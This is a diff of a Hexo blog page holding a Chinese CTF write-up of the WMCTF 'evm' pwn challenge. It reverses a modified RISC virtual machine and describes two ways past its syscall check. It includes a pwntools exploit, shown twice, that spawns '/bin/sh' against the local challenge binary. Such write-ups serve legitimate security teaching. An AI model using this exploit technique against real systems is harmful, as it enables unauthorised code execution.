@@ -19,12 +19,12 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog,blog,pwn,heap,wp">
     
     <meta name="description" content="">
-    <meta name="description" content="题目分析虚拟机，一拖史。逆向上来走了歪路，见识太少没有识别出32个寄存器的RISC架构，反而修错了一个结构体，后面看的很费劲。 主函数看不懂，居然还有时间戳，找到了解析指令的函数但是太过混乱（吃了不懂risc的亏），后续官方wp说是魔改risc才回来重新看的。 虚拟机vm在主函数栈上声明，是一个__int64数组，大小37，前4个用于存放初始化的内存地址，后面32个是通用寄存器，结合指令推进函数最">
+    <meta name="description" content="题目分析 虚拟机，一拖史。逆向上来走了歪路，见识太少没有识别出32个寄存器的RISC架构，反而修错了一个结构体，后面看的很费劲。 主函数看不懂，居然还有时间戳，找到了解析指令的函数但是太过混乱（吃了不懂risc的亏），后续官方wp说是魔改risc才回来重新看的。 虚拟机vm在主函数栈上声明，是一个__int64数组，大小37，前4个用于存放初始化的内存地址，后面32个是通用寄存器，结合指令推进函数">
 <meta property="og:type" content="article">
 <meta property="og:title" content="WMCTF2023evm非预期">
 <meta property="og:url" content="http://example.com/2024/09/16/WMCTF2024evm%E9%9D%9E%E9%A2%84%E6%9C%9F/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="题目分析虚拟机，一拖史。逆向上来走了歪路，见识太少没有识别出32个寄存器的RISC架构，反而修错了一个结构体，后面看的很费劲。 主函数看不懂，居然还有时间戳，找到了解析指令的函数但是太过混乱（吃了不懂risc的亏），后续官方wp说是魔改risc才回来重新看的。 虚拟机vm在主函数栈上声明，是一个__int64数组，大小37，前4个用于存放初始化的内存地址，后面32个是通用寄存器，结合指令推进函数最">
+<meta property="og:description" content="题目分析 虚拟机，一拖史。逆向上来走了歪路，见识太少没有识别出32个寄存器的RISC架构，反而修错了一个结构体，后面看的很费劲。 主函数看不懂，居然还有时间戳，找到了解析指令的函数但是太过混乱（吃了不懂risc的亏），后续官方wp说是魔改risc才回来重新看的。 虚拟机vm在主函数栈上声明，是一个__int64数组，大小37，前4个用于存放初始化的内存地址，后面32个是通用寄存器，结合指令推进函数">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2024-09-16T03:44:31.000Z">
 <meta property="article:modified_time" content="2024-09-16T08:09:01.850Z">
@@ -498,25 +498,30 @@
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
-        <h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>虚拟机，一拖史。逆向上来走了歪路，见识太少没有识别出32个寄存器的RISC架构，反而修错了一个结构体，后面看的很费劲。</p>
+        <h1>题目分析</h1>
+<p>虚拟机，一拖史。逆向上来走了歪路，见识太少没有识别出32个寄存器的RISC架构，反而修错了一个结构体，后面看的很费劲。</p>
 <p>主函数看不懂，居然还有时间戳，找到了解析指令的函数但是太过混乱（吃了不懂risc的亏），后续官方wp说是魔改risc才回来重新看的。</p>
 <p>虚拟机vm在主函数栈上声明，是一个__int64数组，大小37，前4个用于存放初始化的内存地址，后面32个是通用寄存器，结合指令推进函数最后一个是PC寄存器。因此复原结构体：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm</span> // <span class="title">sizeof</span>=</span><span class="number">0x128</span></span><br><span class="line"><span class="number">00000000</span> &#123;                                       <span class="comment">// XREF: main/r</span></span><br><span class="line"><span class="number">00000000</span>     <span class="type">void</span> *page_table0;</span><br><span class="line"><span class="number">00000008</span>     <span class="type">void</span> *page_table1;</span><br><span class="line"><span class="number">00000010</span>     <span class="type">void</span> *mem3;</span><br><span class="line"><span class="number">00000018</span>     <span class="type">void</span> *mem4;</span><br><span class="line"><span class="number">00000020</span>     __int64 regs[<span class="number">32</span>];</span><br><span class="line"><span class="number">00000120</span>     __int64 pc;</span><br><span class="line"><span class="number">00000128</span> &#125;;</span><br></pre></td></tr></table></figure>
 <p>实在是不想人工看了，指令解析没有再细看，反正是个RISC32，4字节长度实现了一些运算，访存和一小部分的跳转分支指令。</p>
-<h1 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h1><p>这里虚拟机运行函数相当于是开了两个进程（就是复制粘贴两个一模一样的，前后两部分代码只有一个参数flag 0 和 1的区别），跟进这个可疑的flag发现，这个标志位参数在这个函数里被调用，对应了两个不同的页：</p>
+<h1>关键点</h1>
+<p>这里虚拟机运行函数相当于是开了两个进程（就是复制粘贴两个一模一样的，前后两部分代码只有一个参数flag 0 和 1的区别），跟进这个可疑的flag发现，这个标志位参数在这个函数里被调用，对应了两个不同的页：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">calc_page_addr</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="keyword">struct</span> vm *vm,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> __int64 va,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> __int8 select_table,</span></span><br><span class="line"><span class="params">        __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 page_num; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">if</span> ( va &gt; <span class="number">0x1FFFFF</span> )</span><br><span class="line">    _Exit(<span class="number">1</span>);</span><br><span class="line">  page_num = *(_QWORD *)(*((_QWORD *)&amp;vm-&gt;page_table0 + select_table) + <span class="number">8</span> * (va &gt;&gt; <span class="number">12</span>));</span><br><span class="line">  <span class="keyword">if</span> ( (a4 &amp; page_num) == <span class="number">0</span> )</span><br><span class="line">    _Exit(<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (page_num &amp; <span class="number">8</span>) == <span class="number">0</span> )</span><br><span class="line">    _Exit(<span class="number">3</span>);</span><br><span class="line">  <span class="keyword">return</span> page_num &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL | va &amp; <span class="number">0xFFF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>仔细观察可以发现两个地址的操作没有任何不同，唯一的不同在于，在解析指令的时候，syscall需要flag为1才能触发，另一个进程不执行syscall。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)opcode == <span class="number">0x73</span> ) <span class="comment">// syscall &lt;-we need to be here</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( flag )</span><br><span class="line">    <span class="keyword">return</span> syscall(vm-&gt;regs[<span class="number">10</span>], vm-&gt;regs[<span class="number">11</span>], vm-&gt;regs[<span class="number">12</span>], vm-&gt;regs[<span class="number">13</span>], vm-&gt;regs[<span class="number">14</span>], vm-&gt;regs[<span class="number">15</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>但是对于flag为1的那部分指令存储，这里只允许全是0x13：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> read(<span class="number">0</span>, buf, buf_size);  <span class="comment">// second input using page1</span></span><br><span class="line"><span class="comment">// 只有page1能触发syscall</span></span><br><span class="line"> <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="type">unsigned</span> __int64)buf_size &gt;&gt; <span class="number">2</span>; ++i )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">if</span> ( *((_DWORD *)buf + i) != <span class="number">0x13</span> )</span><br><span class="line">     _Exit(<span class="number">1</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
 <p>那我们就要想办法执行syscall</p>
-<h1 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h1><p>预期解是将指令解析逆出来了，发现有一种store不经过我们calc_pageaddr的虚拟地址页表转换：</p>
+<h1>预期解</h1>
+<p>预期解是将指令解析逆出来了，发现有一种store不经过我们calc_pageaddr的虚拟地址页表转换：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x2C</span>:</span><br><span class="line">  v16 = vm-&gt;regs[(instruct &gt;&gt; <span class="number">15</span>) &amp; <span class="number">0x1F</span>]</span><br><span class="line">      + (((<span class="type">unsigned</span> __int16)instruct &gt;&gt; <span class="number">7</span>) &amp; <span class="number">0x1F</span>)</span><br><span class="line">      + <span class="number">32</span> * (HIBYTE(instruct) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  v18 = vm-&gt;regs[(HIWORD(instruct) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x1F</span>];</span><br><span class="line">  v21 = (__int64 *)((<span class="type">char</span> *)vm-&gt;mem3 + v16);<span class="comment">// 硬编码</span></span><br><span class="line">  <span class="keyword">if</span> ( v16 &gt; <span class="number">0x1FFFFF</span> )</span><br><span class="line">    _Exit(<span class="number">1</span>);</span><br><span class="line">  opcode = (BYTE1(instruct) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)opcode == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    opcode = (__int64)vm-&gt;mem3 + v16;</span><br><span class="line">    *v21 = v18;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( ((BYTE1(instruct) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">7u</span>) &lt;= <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)opcode == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opcode = (__int64)vm-&gt;mem3 + v16;</span><br><span class="line">      *(_DWORD *)v21 = v18;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opcode = (__int64)vm-&gt;mem3 + v16;</span><br><span class="line">      <span class="keyword">if</span> ( ((BYTE1(instruct) &gt;&gt; <span class="number">4</span>) &amp; <span class="number">7</span>) != <span class="number">0</span> )</span><br><span class="line">        *(_WORD *)v21 = v18;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_BYTE *)v21 = v18;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
-<p>预期解是，利用页表0能执行的除了syscall的所有指令控制好寄存器，利用这个立即数写入地址不经过转换的漏洞在页表1写入能够执行的syscall指令，填上0x13绕过检查后执行后面的syscall。题目中在数据段为我们留好了”&#x2F;bin&#x2F;sh”字符串，而且也没开aslr，直接拿就行。</p>
-<h1 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h1><p>观察上面的循环0x13检查：</p>
+<p>预期解是，利用页表0能执行的除了syscall的所有指令控制好寄存器，利用这个立即数写入地址不经过转换的漏洞在页表1写入能够执行的syscall指令，填上0x13绕过检查后执行后面的syscall。题目中在数据段为我们留好了&quot;/bin/sh&quot;字符串，而且也没开aslr，直接拿就行。</p>
+<h1>非预期</h1>
+<p>观察上面的循环0x13检查：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="type">unsigned</span> __int64)buf_size &gt;&gt; <span class="number">2</span>; ++i )</span><br></pre></td></tr></table></figure>
-<p>出题人应该本来想限制i循环次数在bufsize&#x2F;4以内的，但是这里用了个右移2位的操作（可能是编译器优化或者什么），也就是说，如果buf_size只有2位，这个检查就不会生效了。我们为bufsize输入3，直接就能写入3个字节的code，这里就直接写入syscall就行了。</p>
-<h1 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">p=process(<span class="string">&#x27;./evm&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./evm&#x27;</span>)</span><br><span class="line">binsh=<span class="number">0x4050a0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addi</span>(<span class="params">rd, rs1, imm</span>):</span><br><span class="line">    <span class="keyword">return</span> p32((imm &lt;&lt; <span class="number">20</span>) | (rs1 &lt;&lt; <span class="number">15</span>) | (<span class="number">0b000</span> &lt;&lt; <span class="number">12</span>) | (rd &lt;&lt; <span class="number">7</span>) | <span class="number">0x13</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">slli</span>(<span class="params">rd, rs1, imm</span>):</span><br><span class="line">    <span class="keyword">return</span> p32((imm &lt;&lt; <span class="number">20</span>) | (rs1 &lt;&lt; <span class="number">15</span>) | (<span class="number">0b001</span> &lt;&lt; <span class="number">12</span>) | (rd &lt;&lt; <span class="number">7</span>) | <span class="number">0x13</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reg_xor</span>(<span class="params">rd, rs1, rs2</span>):</span><br><span class="line">    <span class="keyword">return</span> p32((<span class="number">0</span> &lt;&lt; <span class="number">25</span>) | (rs2 &lt;&lt; <span class="number">20</span>) | (rs1 &lt;&lt; <span class="number">15</span>) | (<span class="number">0b100</span> &lt;&lt; <span class="number">12</span>) | (rd &lt;&lt; <span class="number">7</span>) | <span class="number">0x33</span>)</span><br><span class="line"></span><br><span class="line">payload = (</span><br><span class="line">    reg_xor(<span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>)</span><br><span class="line">    + reg_xor(<span class="number">11</span>,<span class="number">11</span>,<span class="number">11</span>)</span><br><span class="line">    + reg_xor(<span class="number">12</span>,<span class="number">12</span>,<span class="number">12</span>)</span><br><span class="line">    + reg_xor(<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>)</span><br><span class="line">    + addi(<span class="number">10</span>, <span class="number">10</span>, <span class="number">0x3B</span>)</span><br><span class="line">    + addi(<span class="number">11</span>, <span class="number">11</span>, <span class="number">0x405</span>)</span><br><span class="line">    + slli(<span class="number">11</span>, <span class="number">11</span>, <span class="number">12</span>)</span><br><span class="line">    + addi(<span class="number">11</span>, <span class="number">11</span>, <span class="number">0xA0</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;standard&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>&quot;</span>.encode())<span class="comment"># lenth of code</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(payload)<span class="comment">#page0 code here</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)<span class="comment"># bufsize</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;\x73\x00\x00&#x27;</span>)<span class="comment"># page1 code（BYPASS!!!)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>出题人应该本来想限制i循环次数在bufsize/4以内的，但是这里用了个右移2位的操作（可能是编译器优化或者什么），也就是说，如果buf_size只有2位，这个检查就不会生效了。我们为bufsize输入3，直接就能写入3个字节的code，这里就直接写入syscall就行了。</p>
+<h1>exp：</h1>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">p=process(<span class="string">&#x27;./evm&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./evm&#x27;</span>)</span><br><span class="line">binsh=<span class="number">0x4050a0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addi</span>(<span class="params">rd, rs1, imm</span>):</span><br><span class="line">    <span class="keyword">return</span> p32((imm &lt;&lt; <span class="number">20</span>) | (rs1 &lt;&lt; <span class="number">15</span>) | (<span class="number">0b000</span> &lt;&lt; <span class="number">12</span>) | (rd &lt;&lt; <span class="number">7</span>) | <span class="number">0x13</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">slli</span>(<span class="params">rd, rs1, imm</span>):</span><br><span class="line">    <span class="keyword">return</span> p32((imm &lt;&lt; <span class="number">20</span>) | (rs1 &lt;&lt; <span class="number">15</span>) | (<span class="number">0b001</span> &lt;&lt; <span class="number">12</span>) | (rd &lt;&lt; <span class="number">7</span>) | <span class="number">0x13</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reg_xor</span>(<span class="params">rd, rs1, rs2</span>):</span><br><span class="line">    <span class="keyword">return</span> p32((<span class="number">0</span> &lt;&lt; <span class="number">25</span>) | (rs2 &lt;&lt; <span class="number">20</span>) | (rs1 &lt;&lt; <span class="number">15</span>) | (<span class="number">0b100</span> &lt;&lt; <span class="number">12</span>) | (rd &lt;&lt; <span class="number">7</span>) | <span class="number">0x33</span>)</span><br><span class="line"></span><br><span class="line">payload = (</span><br><span class="line">    reg_xor(<span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>)</span><br><span class="line">    + reg_xor(<span class="number">11</span>,<span class="number">11</span>,<span class="number">11</span>)</span><br><span class="line">    + reg_xor(<span class="number">12</span>,<span class="number">12</span>,<span class="number">12</span>)</span><br><span class="line">    + reg_xor(<span class="number">13</span>,<span class="number">13</span>,<span class="number">13</span>)</span><br><span class="line">    + addi(<span class="number">10</span>, <span class="number">10</span>, <span class="number">0x3B</span>)</span><br><span class="line">    + addi(<span class="number">11</span>, <span class="number">11</span>, <span class="number">0x405</span>)</span><br><span class="line">    + slli(<span class="number">11</span>, <span class="number">11</span>, <span class="number">12</span>)</span><br><span class="line">    + addi(<span class="number">11</span>, <span class="number">11</span>, <span class="number">0xA0</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;standard&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>&quot;</span>.encode())<span class="comment"># lenth of code</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(payload)<span class="comment">#page0 code here</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)<span class="comment"># bufsize</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;\x73\x00\x00&#x27;</span>)<span class="comment"># page1 code（BYPASS!!!)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
     </article>
     <!-- license -->
     
@@ -671,7 +676,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">关键点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="toc-number">3.</span> <span class="toc-text">预期解</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">4.</span> <span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">exp：</span></a></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">关键点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">预期解</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">exp：</span></a></li></ol>
             </div>
         
         <!-- sidebar -->
@@ -951,6 +956,12 @@
         
         
     
+        
+        
+        
+        
+        
+        
         
         
         
@@ -1773,24 +1784,9 @@
                 算法
             </span>
         
-            <span class="sidebar-tag-name" data-tags="Android">
-                <span class="iconfont-archer">&#xe606;</span>
-                Android
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="逆向">
-                <span class="iconfont-archer">&#xe606;</span>
-                逆向
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="pwn">
                 <span class="iconfont-archer">&#xe606;</span>
                 pwn
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="chop">
-                <span class="iconfont-archer">&#xe606;</span>
-                chop
             </span>
         
             <span class="sidebar-tag-name" data-tags="wp">
@@ -1803,6 +1799,21 @@
                 heap
             </span>
         
+            <span class="sidebar-tag-name" data-tags="Android">
+                <span class="iconfont-archer">&#xe606;</span>
+                Android
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="逆向">
+                <span class="iconfont-archer">&#xe606;</span>
+                逆向
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="chop">
+                <span class="iconfont-archer">&#xe606;</span>
+                chop
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="CSAPP">
                 <span class="iconfont-archer">&#xe606;</span>
                 CSAPP
@@ -1811,6 +1822,11 @@
             <span class="sidebar-tag-name" data-tags="Lab">
                 <span class="iconfont-archer">&#xe606;</span>
                 Lab
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Develop">
+                <span class="iconfont-archer">&#xe606;</span>
+                Develop
             </span>
         
             <span class="sidebar-tag-name" data-tags="Windows">
@@ -1823,19 +1839,9 @@
                 CVE
             </span>
         
-            <span class="sidebar-tag-name" data-tags="Develop">
-                <span class="iconfont-archer">&#xe606;</span>
-                Develop
-            </span>
-        
             <span class="sidebar-tag-name" data-tags="protobuf">
                 <span class="iconfont-archer">&#xe606;</span>
                 protobuf
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="kernel">
-                <span class="iconfont-archer">&#xe606;</span>
-                kernel
             </span>
         
             <span class="sidebar-tag-name" data-tags="FSOP">
@@ -1843,14 +1849,19 @@
                 FSOP
             </span>
         
-            <span class="sidebar-tag-name" data-tags="llvm">
+            <span class="sidebar-tag-name" data-tags="kernel">
                 <span class="iconfont-archer">&#xe606;</span>
-                llvm
+                kernel
             </span>
         
             <span class="sidebar-tag-name" data-tags="Rust">
                 <span class="iconfont-archer">&#xe606;</span>
                 Rust
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="llvm">
+                <span class="iconfont-archer">&#xe606;</span>
+                llvm
             </span>
         
             <span class="sidebar-tag-name" data-tags="vm">
